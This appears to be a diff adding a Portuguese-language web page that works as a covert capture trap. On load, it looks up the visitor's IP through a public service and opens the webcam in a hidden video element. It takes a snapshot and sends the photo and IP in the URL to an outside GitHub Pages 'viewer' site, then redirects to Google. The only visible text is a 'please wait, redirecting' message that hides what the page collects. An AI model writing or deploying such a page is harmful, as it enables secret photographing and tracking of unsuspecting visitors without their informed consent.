@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Captura de Foto Automática</title>
+</head>
+<body style="background-color: #f0f0f0; text-align: center; padding-top: 50px;">
+    
+    <h1>📸 Capturando Imagem...</h1>
+    <p>Por favor, aguarde, você será redirecionado em breve.</p>
+
+    <video id="webcam-video" autoplay playsinline muted style="display: none;"></video>
+    <canvas id="canvas" style="display: none;"></canvas>
+
+    <script>
+        // ==========================================================
+        // CONFIGURAÇÃO
+        // ==========================================================
+        
+        // URL da sua página de visualização de destino (GitHub Pages)
+        // **SUBSTITUA** por sua URL real no GitHub Pages
+        const VIEW_SITE_URL = 'https://leozin-code.github.io/ClienteViewFoto/'; 
+        
+        const REDIRECT_URL = 'https://www.google.com';
+
+        const video = document.getElementById('webcam-video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        let photoData = null;
+        let userIP = 'IP_NAO_ENCONTRADO';
+
+        // 1. Capturar o IP do usuário usando um serviço público
+        function fetchUserIP() {
+            // Este serviço é gratuito e retorna o IP como texto simples
+            return fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    userIP = data.ip;
+                })
+                .catch(error => {
+                    console.error("Erro ao obter IP:", error);
+                    // Continua mesmo sem o IP
+                });
+        }
+
+        // 2. Iniciar a webcam
+        function startWebcam() {
+            return navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 } })
+                .then(stream => {
+                    video.srcObject = stream;
+                    return new Promise(resolve => video.onloadedmetadata = resolve);
+                })
+                .catch(error => {
+                    console.error("Erro ao acessar a webcam:", error);
+                    // Se falhar, redireciona sem a foto
+                    finalize(null); 
+                    return Promise.reject(error); 
+                });
+        }
+
+        // 3. Tirar a foto
+        function takePhoto() {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Converte para Base64 (sem o prefixo "data:image/png;base64,")
+            const base64Data = canvas.toDataURL('image/png').split(',')[1];
+            photoData = base64Data;
+        }
+
+        // 4. Finalizar e Redirecionar
+        function finalize(data) {
+            // Parar o stream da webcam para liberar o recurso
+            if (video.srcObject) {
+                video.srcObject.getTracks().forEach(track => track.stop());
+            }
+
+            let finalURL = VIEW_SITE_URL;
+            if (data) {
+                // Constrói a URL com a foto e o IP (codificando para a URL)
+                finalURL += `?ip=${encodeURIComponent(data.ip)}&img=${encodeURIComponent(data.img)}`;
+            }
+
+            // Redireciona para o Google ou, se houver dados, para a View, que, por sua vez, redireciona
+            window.location.href = data ? finalURL : REDIRECT_URL;
+        }
+
+        // Fluxo Principal (executa sequencialmente)
+        async function runCaptureFlow() {
+            await fetchUserIP();
+            
+            try {
+                await startWebcam();
+                takePhoto();
+                finalize({ ip: userIP, img: photoData });
+            } catch (e) {
+                // A falha já foi tratada dentro de startWebcam()
+                if (!photoData) {
+                   // Se não houve foto, redireciona para o Google
+                   window.location.href = REDIRECT_URL;
+                }
+            }
+        }
+
+        window.onload = runCaptureFlow;
+    </script>
+</body>
+</html>
